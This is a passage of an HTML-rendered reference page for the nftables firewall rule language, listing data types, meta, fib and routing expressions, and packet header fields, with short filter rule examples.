type</th></tr></thead><tbody><tr><td>String</td><td>string</td><td>variable</td><td>-</td></tr></tbody></table><p>The string type is used to for character strings. A string begins with an alphabetic character (a-zA-Z) followed by zero or more alphanumeric characters or the characters /, -, _ and .. In addition anything enclosed in double quotes (") is recognized as a string.</p><p><strong><em>示例 4. String specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Interface name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input iifname eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Weird interface name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input iifname "(eth0)"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="link-layer-address-type">Link layer address type<a class="hash-link" href="#link-layer-address-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 12.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>Link layer address</td><td>lladdr</td><td>variable</td><td>integer</td></tr></tbody></table><p>The link layer address type is used for link layer addresses. Link layer addresses are specified as a variable amount of groups of two hexadecimal digits separated using colons (:).</p><p><strong><em>示例 5. Link layer address specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Ethernet destination MAC address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input ether daddr 20:c9:d0:43:12:d9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipv4-address-type">IPv4 address type<a class="hash-link" href="#ipv4-address-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 13.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>IPv4 address</td><td>ipv4_addr</td><td>32 bit</td><td>integer</td></tr></tbody></table><p>The IPv4 address type is used for IPv4 addresses. Addresses are specified in either dotted decimal, dotted hexadecimal, dotted octal, decimal, hexadecimal, octal notation or as a host name. A host name will be resolved using the standard system resolver.</p><p><strong><em>示例 6. IPv4 address specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># dotted decimal notation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output ip daddr 127.0.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># host name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output ip daddr localhost</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipv6-address-type">IPv6 address type<a class="hash-link" href="#ipv6-address-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 14.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>IPv6 address</td><td>ipv6_addr</td><td>128 bit</td><td>integer</td></tr></tbody></table><p>The IPv6 address type is used for IPv6 addresses. FIXME</p><p><strong><em>示例 7. IPv6 address specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># abbreviated loopback address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output ip6 daddr ::1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="boolean-type">Boolean type<a class="hash-link" href="#boolean-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 15.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>Boolean</td><td>boolean</td><td>1 bit</td><td>integer</td></tr></tbody></table><p>The boolean type is a syntactical helper type in user space. It's use is in the right-hand side of a (typically implicit) relational expression to change the expression on the left-hand side into a boolean check (usually for existence).</p><p>The following keywords will automatically resolve into a boolean type with given value:</p><p><strong><em>Table 16.</em></strong></p><table><thead><tr><th>Keyword</th><th>Value</th></tr></thead><tbody><tr><td>exists</td><td>1</td></tr><tr><td>missing</td><td>0</td></tr></tbody></table><p><strong><em>示例 8. Boolean specification</em></strong></p><p>The following expressions support a boolean comparison:</p><p><strong><em>Table 17.</em></strong></p><table><thead><tr><th>Expression</th><th>Behaviour</th></tr></thead><tbody><tr><td>fib</td><td>Check route existence.</td></tr><tr><td>exthdr</td><td>Check IPv6 extension header existence.</td></tr><tr><td>tcp option</td><td>Check TCP option header existence.</td></tr></tbody></table><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># match if route exists</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input fib daddr . iif oif exists</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># match only non-fragmented packets in IPv6 traffic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input exthdr frag missing</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># match if TCP timestamp option is present</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input tcp option timestamp exists</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="icmp-type-type">ICMP Type type<a class="hash-link" href="#icmp-type-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 18.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>ICMP Type</td><td>icmp_type</td><td>8 bit</td><td>integer</td></tr></tbody></table><p>The ICMP Type type is used to conveniently specify the ICMP header's type field.</p><p>The following keywords may be used when specifying the ICMP type:</p><p><strong><em>Table 19.</em></strong></p><table><thead><tr><th>Keyword</th><th>Value</th></tr></thead><tbody><tr><td>echo-reply</td><td>0</td></tr><tr><td>destination-unreachable</td><td>3</td></tr><tr><td>source-quench</td><td>4</td></tr><tr><td>redirect</td><td>5</td></tr><tr><td>echo-request</td><td>8</td></tr><tr><td>router-advertisement</td><td>9</td></tr><tr><td>router-solicitation</td><td>10</td></tr><tr><td>time-exceeded</td><td>11</td></tr><tr><td>parameter-problem</td><td>12</td></tr><tr><td>timestamp-request</td><td>13</td></tr><tr><td>timestamp-reply</td><td>14</td></tr><tr><td>info-request</td><td>15</td></tr><tr><td>info-reply</td><td>16</td></tr><tr><td>address-mask-request</td><td>17</td></tr><tr><td>address-mask-reply</td><td>18</td></tr></tbody></table><p><strong><em>示例 9. ICMP Type specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># match ping packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output icmp type { echo-request, echo-reply }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="icmpv6-type-type">ICMPv6 Type type<a class="hash-link" href="#icmpv6-type-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 20.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>ICMPv6 Type</td><td>icmpv6_type</td><td>8 bit</td><td>integer</td></tr></tbody></table><p>The ICMPv6 Type type is used to conveniently specify the ICMPv6 header's type field.</p><p>The following keywords may be used when specifying the ICMPv6 type:</p><p><strong><em>Table 21.</em></strong></p><table><thead><tr><th>Keyword</th><th>Value</th></tr></thead><tbody><tr><td>destination-unreachable</td><td>1</td></tr><tr><td>packet-too-big</td><td>2</td></tr><tr><td>time-exceeded</td><td>3</td></tr><tr><td>parameter-problem</td><td>4</td></tr><tr><td>echo-request</td><td>128</td></tr><tr><td>echo-reply</td><td>129</td></tr><tr><td>mld-listener-query</td><td>130</td></tr><tr><td>mld-listener-report</td><td>131</td></tr><tr><td>mld-listener-done</td><td>132</td></tr><tr><td>mld-listener-reduction</td><td>132</td></tr><tr><td>nd-router-solicit</td><td>133</td></tr><tr><td>nd-router-advert</td><td>134</td></tr><tr><td>nd-neighbor-solicit</td><td>135</td></tr><tr><td>nd-neighbor-advert</td><td>136</td></tr><tr><td>nd-redirect</td><td>137</td></tr><tr><td>router-renumbering</td><td>138</td></tr><tr><td>ind-neighbor-solicit</td><td>141</td></tr><tr><td>ind-neighbor-advert</td><td>142</td></tr><tr><td>mld2-listener-report</td><td>143</td></tr></tbody></table><p><strong><em>示例 10. ICMPv6 Type specification</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># match ICMPv6 ping packets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output icmpv6 type { echo-request, echo-reply }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="primary-expressions">Primary expressions<a class="hash-link" href="#primary-expressions" title="标题的直接链接">​</a></h2><p>The lowest order expression is a primary expression, representing either a constant or a single datum from a packet's payload, meta data or a stateful module.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="meta-expressions">Meta expressions<a class="hash-link" href="#meta-expressions" title="标题的直接链接">​</a></h3><p><code>meta {length | nfproto | l4proto | protocol | priority}</code></p><p><code>[meta] {mark | iif | iifname | iiftype | oif | oifname | oiftype}</code>
<code>[meta] {skuid | skgid | nftrace | rtclassid | ibriport | obriport | pkttype | cpu | iifgroup | oifgroup | cgroup | random}</code></p><p>A meta expression refers to meta data associated with a packet.</p><p>There are two types of meta expressions: unqualified and qualified meta expressions. Qualified meta expressions require the <strong><em>meta</em></strong> keyword before the meta key, unqualified meta expressions can be specified by using the meta key directly or as qualified meta expressions.</p><p><strong><em>Table 22. Meta expression types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>length</td><td>Length of the packet in bytes</td><td>integer (32 bit)</td></tr><tr><td>protocol</td><td>Ethertype protocol value</td><td>ether_type</td></tr><tr><td>priority</td><td>TC packet priority</td><td>tc_handle</td></tr><tr><td>mark</td><td>Packet mark</td><td>mark</td></tr><tr><td>iif</td><td>Input interface index</td><td>iface_index</td></tr><tr><td>iifname</td><td>Input interface name</td><td>string</td></tr><tr><td>iiftype</td><td>Input interface type</td><td>iface_type</td></tr><tr><td>oif</td><td>Output interface index</td><td>iface_index</td></tr><tr><td>oifname</td><td>Output interface name</td><td>string</td></tr><tr><td>oiftype</td><td>Output interface hardware type</td><td>iface_type</td></tr><tr><td>skuid</td><td>UID associated with originating socket</td><td>uid</td></tr><tr><td>skgid</td><td>GID associated with originating socket</td><td>gid</td></tr><tr><td>rtclassid</td><td>Routing realm</td><td>realm</td></tr><tr><td>ibriport</td><td>Input bridge interface name</td><td>string</td></tr><tr><td>obriport</td><td>Output bridge interface name</td><td>string</td></tr><tr><td>pkttype</td><td>packet type</td><td>pkt_type</td></tr><tr><td>cpu</td><td>cpu number processing the packet</td><td>integer (32 bits)</td></tr><tr><td>iifgroup</td><td>incoming device group</td><td>devgroup</td></tr><tr><td>oifgroup</td><td>outgoing device group</td><td>devgroup</td></tr><tr><td>cgroup</td><td>control group id</td><td>integer (32 bits)</td></tr><tr><td>random</td><td>pseudo-random number</td><td>integer (32 bits)</td></tr></tbody></table><p><strong><em>Table 23. Meta expression specific types</em></strong></p><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>iface_index</td><td>Interface index (32 bit number). Can be specified numerically or as name of an existing interface.</td></tr><tr><td>ifname</td><td>Interface name (16 byte string). Does not have to exist.</td></tr><tr><td>iface_type</td><td>Interface type (16 bit number).</td></tr><tr><td>uid</td><td>User ID (32 bit number). Can be specified numerically or as user name.</td></tr><tr><td>gid</td><td>Group ID (32 bit number). Can be specified numerically or as group name.</td></tr><tr><td>realm</td><td>Routing Realm (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/rt_realms.</td></tr><tr><td>devgroup_type</td><td>Device group (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/group.</td></tr><tr><td>pkt_type</td><td>Packet type: Unicast (addressed to local host), Broadcast (to all), Multicast (to group).</td></tr></tbody></table><p><strong><em>示例 11. Using meta expressions</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qualified meta expression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output meta oif eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># unqualified meta expression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output oif eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="fib-expressions">fib expressions<a class="hash-link" href="#fib-expressions" title="标题的直接链接">​</a></h3><p><strong><em>fib</em></strong> {saddr | daddr <!-- -->[mark | iif | oif]<!-- -->} {oif | oifname | type}</p><p>A fib expression queries the fib (forwarding information base) to obtain information such as the output interface index a particular address would use. The input is a tuple of elements that is used as input to the fib lookup functions.</p><p><strong><em>Table 24. fib expression specific types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>oif</td><td>Output interface index</td><td>integer (32 bit)</td></tr><tr><td>oifname</td><td>Output interface name</td><td>string</td></tr><tr><td>type</td><td>Address type</td><td>fib_addrtype</td></tr></tbody></table><p><strong><em>示例 12. Using fib expressions</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># drop packets without a reverse path</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter prerouting fib saddr . iif oif missing drop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># drop packets to address not configured on ininterface</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter prerouting fib daddr . iif type != { local, broadcast, multicast } drop</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># perform lookup in a specific 'blackhole' table (0xdead, needs ip appropriate ip rule)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter prerouting meta mark set 0xdead fib daddr . mark type vmap { blackhole : drop, prohibit : jump prohibited, unreachable : drop }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="routing-expressions">Routing expressions<a class="hash-link" href="#routing-expressions" title="标题的直接链接">​</a></h3><p><strong><em>rt</em></strong> {classid | nexthop}</p><p>A routing expression refers to routing data associated with a packet.</p><p><strong><em>Table 25. Routing expression types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>classid</td><td>Routing realm</td><td>realm</td></tr><tr><td>nexthop</td><td>Routing nexthop</td><td>ipv4_addr/ipv6_addr</td></tr></tbody></table><p><strong><em>Table 26. Routing expression specific types</em></strong></p><table><thead><tr><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>realm</td><td>Routing Realm (32 bit number). Can be specified numerically or as symbolic name defined in /etc/iproute2/rt_realms.</td></tr></tbody></table><p><strong><em>示例 13. Using routing expressions</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># IP family independent rt expression</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter output rt classid 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># IP family dependent rt expressions</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip filter output rt nexthop 192.168.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ip6 filter output rt nexthop fd00::1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">inet filter meta nfproto ipv4 output rt nexthop 192.168.0.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">inet filter meta nfproto ipv6 output rt nexthop fd00::1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="payload-expressions">Payload expressions<a class="hash-link" href="#payload-expressions" title="标题的直接链接">​</a></h2><p>Payload expressions refer to data from the packet's payload.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ethernet-header-expression">Ethernet header expression<a class="hash-link" href="#ethernet-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>ether</em></strong> <!-- -->[<em>ethernet header field</em>]</p><p><strong><em>Table 27. Ethernet header expression types</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>daddr</td><td>Destination MAC address</td><td>ether_addr</td></tr><tr><td>saddr</td><td>Source MAC address</td><td>ether_addr</td></tr><tr><td>type</td><td>EtherType</td><td>ether_type</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="vlan-header-expression">VLAN header expression<a class="hash-link" href="#vlan-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>vlan</em></strong> <!-- -->[<em>VLAN header field</em>]</p><p><strong><em>Table 28. VLAN header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>id</td><td>VLAN ID (VID)</td><td>integer (12 bit)</td></tr><tr><td>cfi</td><td>Canonical Format Indicator</td><td>integer (1 bit)</td></tr><tr><td>pcp</td><td>Priority code point</td><td>integer (3 bit)</td></tr><tr><td>type</td><td>EtherType</td><td>ether_type</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="arp-header-expression">ARP header expression<a class="hash-link" href="#arp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>arp</em></strong> <!-- -->[<em>ARP header field</em>]</p><p><strong><em>Table 29. ARP header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>htype</td><td>ARP hardware type</td><td>integer (16 bit)</td></tr><tr><td>ptype</td><td>EtherType</td><td>ether_type</td></tr><tr><td>hlen</td><td>Hardware address len</td><td>integer (8 bit)</td></tr><tr><td>plen</td><td>Protocol address len</td><td>integer (8 bit)</td></tr><tr><td>operation</td><td>Operation</td><td>arp_op</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipv4-header-expression">IPv4 header expression<a class="hash-link" href="#ipv4-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>ip</em></strong> <!-- -->[<em>IPv4 header field</em>]</p><p><strong><em>Table 30. IPv4 header expression</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>version</td><td>IP header version (4)</td><td>integer (4 bit)</td></tr><tr><td>hdrlength</td><td>IP header length including options</td><td>integer (4 bit) FIXME scaling</td></tr><tr><td>dscp</td><td>Differentiated Services Code Point</td><td>dscp</td></tr><tr><td>ecn</td><td>Explicit Congestion Notification</td><td>ecn</td></tr><tr><td>length</td><td>Total packet length</td><td>integer (16 bit)</td></tr><tr><td>id</td><td>IP ID</td><td>integer (16 bit)</td></tr><tr><td>frag-off</td><td>Fragment offset</td><td>integer (16 bit)</td></tr><tr><td>ttl</td><td>Time to live</td><td>integer (8 bit)</td></tr><tr><td>protocol</td><td>Upper layer protocol</td><td>inet_proto</td></tr><tr><td>checksum</td><td>IP header checksum</td><td>integer (16 bit)</td></tr><tr><td>saddr</td><td>Source address</td><td>ipv4_addr</td></tr><tr><td>daddr</td><td>Destination address</td><td>ipv4_addr</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="icmp-header-expression">ICMP header expression<a class="hash-link" href="#icmp-header-expression" title="标题的直接链接">​</a></h3><p><strong><em>icmp</em></strong> <!-- -->[<em>ICMP header field</em>]</p><p><strong><em>Table 31. ICMP header 